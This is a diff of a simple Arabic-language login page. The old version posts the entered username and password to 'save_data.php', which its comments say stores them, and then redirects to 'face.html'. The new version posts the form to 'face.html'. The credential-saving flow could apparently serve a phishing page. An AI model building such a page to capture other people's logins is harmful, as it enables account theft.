@@ -1,98 +1,78 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
-<style>
-/* أسلوب التصميم هنا */
-body {
-  font-family: Arial, sans-serif;
-  margin: 0;
-  padding: 0;
-  background-color: #f2f2f2;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-
-.login-container {
-  width: 100%;
-  max-width: 400px;
-  padding: 20px;
-  background: #fff;
-  border-radius: 10px;
-  box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
-  text-align: center;
-}
-
-.login-container h2 {
-  margin-bottom: 20px;
-  color: #333;
-}
-
-.login-container input[type="text"],
-.login-container input[type="password"],
-.login-container button {
-  width: calc(100% - 20px);
-  padding: 10px;
-  margin: 10px 0;
-  border: 1px solid #ccc;
-  border-radius: 5px;
-  box-sizing: border-box;
-  transition: border-color 0.3s ease;
-}
-
-.login-container input[type="text"]:focus,
-.login-container input[type="password"]:focus {
-  outline: none;
-  border-color: #007bff;
-}
-
-.login-container button {
-  background: #007bff;
-  color: #fff;
-  cursor: pointer;
-  transition: background-color 0.3s ease;
-}
-
-.login-container button:hover {
-  background-color: #0056b3;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f4f4f4;
+    }
+    .login-container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .login-container h2 {
+      text-align: center;
+    }
+    .login-form {
+      display: flex;
+      flex-direction: column;
+    }
+    .login-form input {
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    .login-form button {
+      padding: 10px;
+      background-color: #5cb85c;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .login-form button:hover {
+      background-color: #4cae4c;
+    }
+  </style>
 </head>
 <body>
-<div class="login-container">
-  <h2>تسجيل الدخول</h2>
-  <form id="loginForm">
-    <input type="text" id="username" placeholder="اسم المستخدم" required>
-    <input type="password" id="password" placeholder="كلمة المرور" required>
-    <button type="submit">تسجيل الدخول</button>
-  </form>
-</div>
+  <div class="login-container">
+    <h2>تسجيل الدخول</h2>
+    <form class="login-form">
+      <input type="text" name="username" placeholder="اسم المستخدم" required>
+      <input type="password" name="password" placeholder="كلمة المرور" required>
+      <button type="submit">دخول</button>
+    </form>
+  </div>
 
-<script>
-document.getElementById("loginForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // منع إرسال النموذج بشكل افتراضي
-  
-  // احصل على قيم اسم المستخدم وكلمة المرور
-  var username = document.getElementById("username").value;
-  var password = document.getElementById("password").value;
-  
-  // إنشاء طلب POST لإرسال البيانات إلى الملف الذي يقوم بحفظها
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "save_data.php", true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-      console.log("تم تسجيل الدخول بنجاح وتم حفظ البيانات!");
-      // هنا يمكنك تحويل المستخدم إلى الصفحة التالية بعد تسجيل الدخول
-      window.location.href = "face.html";
-    }
-  };
-  xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
-});
-</script>
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      const loginForm = document.querySelector('.login-form');
+      loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const formData = new FormData(loginForm);
+        fetch('face.html', {
+          method: 'POST',
+          body: formData
+        }).then(response => {
+          console.log('تم إرسال البيانات');
+        }).catch(error => {
+          console.error('خطأ:', error);
+        });
+      });
+    });
+  </script>
 </body>
 </html>
